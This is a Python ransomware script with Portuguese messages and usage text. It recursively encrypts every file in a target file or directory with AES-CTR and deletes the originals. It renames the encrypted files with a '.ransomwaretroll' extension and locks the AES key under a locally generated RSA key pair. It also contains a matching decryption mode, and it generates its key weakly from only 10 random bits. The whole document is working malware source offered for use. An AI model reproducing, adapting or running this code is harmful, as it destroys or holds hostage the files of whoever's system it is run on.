import sys
import os
import pyaes
import hashlib
import random
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

def gera_par_chaves():
    chave_privada = rsa.generate_private_key(public_exponent = 65537, key_size = 2048)

    chave_publica = chave_privada.public_key()

    with open('par_chaves/priv.pem', 'wb') as priv:
        priv.write(chave_privada.private_bytes(encoding = serialization.Encoding.PEM, format = serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm = serialization.NoEncryption()))
    priv.close()

    with open('par_chaves/pub.pem', 'wb') as pub:
        pub.write(chave_publica.public_bytes(encoding = serialization.Encoding.PEM, format = serialization.PublicFormat.SubjectPublicKeyInfo))
    pub.close()

def criptografa_arquivo(arquivo, chave_cripto):
    with open(arquivo, 'r') as arq:
        conteudo = arq.read()
        with open('{}.ransomwaretroll'.format(arquivo), 'wb') as arqq:
            arqq.write(pyaes.AESModeOfOperationCTR(chave_cripto.encode('utf-8')).encrypt(conteudo))
        arqq.close()
    arq.close()

    os.remove(arquivo)

def criptografa_diretorio(diretorio, chave_cripto):
    for item in os.listdir(diretorio):
        if not os.path.isdir('{}/{}'.format(diretorio, item)):
            criptografa_arquivo('{}/{}'.format(diretorio, item), chave_cripto)
        else:
           criptografa_diretorio('{}/{}'.format(diretorio, item), chave_cripto)

def descripto_arquivo(arquivo, chave_cripto):
    with open(arquivo, 'rb') as arq:
        conteudo = arq.read()
        with open('{}'.format(arquivo.replace('.ransomwaretroll', '')), 'w') as arqq:
            arqq.write(pyaes.AESModeOfOperationCTR(chave_cripto).decrypt(conteudo).decode('utf-8'))
        arqq.close()
    arq.close()
    os.remove(arquivo)

def descripto_diretorio(diretorio, chave_cripto):
    for item in os.listdir(diretorio):
        if not os.path.isdir('{}/{}'.format(diretorio, item)):
            descripto_arquivo('{}/{}'.format(diretorio, item), chave_cripto)
        else:
            descripto_diretorio('{}/{}'.format(diretorio, item), chave_cripto)


def gera_chave():
    return hashlib.sha1(str(random.getrandbits(10)).encode()).hexdigest()[:16]

if len(sys.argv) < 2:
    print('modo de uso')
    print('python ransom.py c|d arquivo|diretorio')
    print('exemplo criptografar um arquivo')
    print('python ransom.py c /tmp/arquivo')
    print('exemplo descriptografar um arquivo')
    print('python ransom.py d /tmp/arquivo.ransomwaretroll')
    print('exemplo criptografar arquivos de um diretorio')
    print('python ransom.py c /tmp')
    print('pyton descriptografar arquivos de um diretorio')
    print('python ransom.py d /tmp')
else:
    match sys.argv[1]:
        case 'c':
            if len(sys.argv) != 3:
                print('exemplo criptografar um arquivo')
                print('python ransom.py c /tmp/arquivo')
                print('exemplo criptografar arquivos de um diretorio')
                print('python ransom.py c /tmp')
            else:
                print('modo criptografia')
                
                if not os.path.exists('par_chaves'):
                    print('diretorio par_chaves nao encontrado. criando diretorio')
                    os.makedirs('par_chaves')
                    gera_par_chaves()
                else:
                    if 'pub.pem' and 'priv.pem' not in os.listdir('par_chaves'):
                        print('par de chaves nao encontrado. gerando agora')
                        if 'pub.pem' in os.listdir('par_chaves'):
                            os.rename('par_chaves/pub.pem', 'par_chaves/pub.pem.old')
                            print('pub.pem renomeado para pub.pem.old')
                        if 'priv.pem' in os.listdir('par_chaves'):
                            os.rename('par_chaves/priv.pem', 'par_chaves/priv.pem.old')
                            print('priv.pem renomeado para priv.pub.old')
                        gera_par_chaves()
                    
                    print('par de chaves gerado no diretorio par_chaves')

                chave_cripto = gera_chave()

                if os.path.isdir(sys.argv[2]):
                    criptografa_diretorio(sys.argv[2], chave_cripto)
                else:
                    criptografa_arquivo(sys.argv[2], chave_cripto)

                chave_publica = 0
                with open('par_chaves/pub.pem', 'rb') as pub:
                    chave_publica = serialization.load_pem_public_key(pub.read())
                pub.close()

                with open('chave', 'w') as chave:
                    chave.write(chave_publica.encrypt(chave_cripto.encode('utf-8'), padding.OAEP(padding.MGF1(algorithm = hashes.SHA256()), algorithm = hashes.SHA256(), label = None)).hex())
                chave.close()
                chave_publica = 0

            print('finalizada criptografia')

        case 'd':
            if len(sys.argv) != 3:
                print('exemplo descriptografar um arquivo')
                print('python ransom.py d /tmp/arquivo.ransomwaretroll')
                print('pyton descriptografar arquivos de um diretorio')
                print('python ransom.py d /tmp')
            else:
                print('modo descriptografia')
                chave_privada, chave_cripto = 0, 0
                with open('chave', 'r') as ch:
                    chave_cripto = bytes.fromhex(ch.read())
                    with open('par_chaves/priv.pem', 'rb') as priv:
                        chave_privada = serialization.load_pem_private_key(priv.read(), password = None)
                    priv.close()
                    chave_cripto = chave_privada.decrypt(chave_cripto, padding.OAEP(padding.MGF1(algorithm = hashes.SHA256()), algorithm = hashes.SHA256(), label = None))
                    chave_privada = 0
                ch.close()

                if os.path.isdir(sys.argv[2]):
                    descripto_diretorio(sys.argv[2], chave_cripto)
                else:
                    descripto_arquivo(sys.argv[2], chave_cripto)

            print('finalizada descriptografia')

        case _:
            print('parametro {} nao aceito'.format(sys.argv[1]))
            print('parametros aceitos:')
            print('c - parametro utilizado para criptografar')
            print('d - parametro utilizado para descriptografar')

